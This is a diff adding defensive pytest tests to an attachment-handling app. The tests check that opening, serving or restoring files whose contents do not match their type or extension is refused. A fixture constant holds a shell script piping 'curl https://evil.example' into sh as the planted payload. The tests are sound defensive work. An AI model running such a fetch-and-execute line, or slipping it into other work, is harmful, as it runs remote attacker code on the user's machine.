@@ -244,6 +244,7 @@ def test_undoing_an_attach_and_redoing_it(ctx, setup):
 
 def test_system_open_uses_the_platforms_viewer(monkeypatch, tmp_path):
     calls = []
+    (tmp_path / "a.pdf").write_bytes(PDF)
     monkeypatch.setattr(att_svc.subprocess, "Popen", calls.append)
     monkeypatch.setattr(att_svc.sys, "platform", "darwin")
     att_svc.system_open(tmp_path / "a.pdf")
@@ -491,3 +492,95 @@ def test_an_update_backup_that_fails_is_tried_again(ctx, setup, monkeypatch, cap
     assert backup.backup_on_version_change(ctx.store.data_dir, "9.9.9") is None
     assert "Could not back up" in caplog.text
     assert not (ctx.store.data_dir / backup.MARKER).exists()  # so the next start tries again
+
+
+# ------------------------------------------------------------------ files that are not what they say
+SCRIPT = b"#!/bin/sh\ncurl https://evil.example | sh\n"
+
+
+def plant(ctx, tx, stored: str, data: bytes, name: str = "x") -> Attachment:
+    """A record and file that got into the data folder by other means than `add` (by hand, an old backup)."""
+    att = Attachment(transaction_id=tx.id, name=name, stored=stored, id=stored.split(".", maxsplit=1)[0])
+    folder = ctx.store.data_dir / "attachments" / tx.id
+    folder.mkdir(parents=True, exist_ok=True)
+    (folder / stored).write_bytes(data)
+    ctx.store.attachments.add(att)
+    return att
+
+
+@pytest.mark.parametrize(
+    ("stored", "data"),
+    [("evil1.command", SCRIPT), ("evil2.sh", SCRIPT), ("evil3.pdf", SCRIPT), ("evil4.png", PDF), ("evil5.app", b"x")],
+)
+def test_open_refuses_files_that_are_not_what_they_say(ctx, setup, monkeypatch, stored, data):
+    calls = []
+    monkeypatch.setattr(att_svc.subprocess, "Popen", calls.append)
+    monkeypatch.setattr(att_svc.sys, "platform", "darwin")
+    att = plant(ctx, expense(ctx, setup), stored, data, name="Rechnung.pdf")
+    with pytest.raises(ValidationError, match=r"doesn’t match its type|missing"):  # .command: not even a path
+        att_svc.open_file(ctx, att)
+    with pytest.raises(ValidationError, match="doesn’t match its type"):
+        att_svc.system_open(file_of(ctx, att))  # also when called with the path alone
+    with pytest.raises(ValidationError, match=r"doesn’t match its type|missing"):
+        att_svc.read(ctx, att)  # nor saved as a copy
+    assert calls == []
+
+
+def test_open_hands_over_a_checked_file(ctx, setup, monkeypatch):
+    opened = []
+    real_open = att_svc.system_open
+    monkeypatch.setattr(att_svc, "system_open", opened.append)
+    att = att_svc.add(ctx, expense(ctx, setup).id, "r.pdf", PDF)
+    att_svc.open_file(ctx, att)
+    assert opened == [file_of(ctx, att)]
+    file_of(ctx, att).unlink()
+    with pytest.raises(ValidationError, match="missing"):
+        att_svc.open_file(ctx, att)
+    with pytest.raises(ValidationError, match="doesn’t match"):
+        real_open(file_of(ctx, att))
+
+
+def test_system_open_refuses_an_oversized_file(tmp_path):
+    big = tmp_path / "big.pdf"
+    big.write_bytes(PDF + b"x" * files.MAX_BYTES)
+    with pytest.raises(ValidationError, match="doesn’t match"):
+        att_svc.system_open(big)
+
+
+@pytest.mark.parametrize(("stored", "data"), [("abc.sh", SCRIPT), ("abc.pdf", SCRIPT), ("abc.png", PDF)])
+def test_restore_refuses_attachment_files_that_are_not_what_they_say(ctx, setup, stored, data):
+    tx = expense(ctx, setup)
+    att = att_svc.add(ctx, tx.id, "receipt.pdf", PDF)
+    files_ = archive.read(archive.create(ctx))
+    files_[f"attachments/{tx.id}/{stored}"] = data
+    files_["attachments.csv"] = files_["attachments.csv"].replace(att.stored.encode(), stored.encode())
+    with pytest.raises(ValidationError, match=f"unexpected file: attachments/{tx.id}/{stored}"):
+        archive.restore(ctx, files_)
+    assert ctx.store.attachments.all() == [att] and att_svc.read(ctx, att) == PDF  # nothing changed
+
+
+def test_restore_refuses_a_command_file_in_the_archive(ctx, setup):
+    tx = expense(ctx, setup)
+    data = zip_with({f"attachments/{tx.id}/x.command": SCRIPT})
+    with pytest.raises(ValidationError, match="unexpected file"):
+        archive.read(data)
+    data = zip_with({f"attachments/{tx.id}/x.sh": SCRIPT, f"attachments/{tx.id}/y.pdf": SCRIPT})
+    with pytest.raises(ValidationError, match="unexpected file"):
+        archive.check(archive.read(data))
+
+
+def test_restore_refuses_records_with_an_extension_not_accepted(ctx, setup):
+    tx = expense(ctx, setup)
+    att = att_svc.add(ctx, tx.id, "receipt.pdf", PDF)
+    files_ = archive.read(archive.create(ctx))
+    files_.pop(f"attachments/{tx.id}/{att.stored}")
+    files_["attachments.csv"] = files_["attachments.csv"].replace(att.stored.encode(), b"abc.command")
+    with pytest.raises(ValidationError, match="can’t be read"):
+        archive.check(files_)
+
+
+async def test_the_route_refuses_files_that_are_not_what_they_say(ctx, setup, client):
+    tx = expense(ctx, setup)
+    for stored, data in (("evil1.pdf", SCRIPT), ("evil2.sh", SCRIPT), ("evil3.png", b"<html><script>")):
+        att = plant(ctx, tx, stored, data)
+        assert (await client.get(att_ui.url(att))).status_code == 404
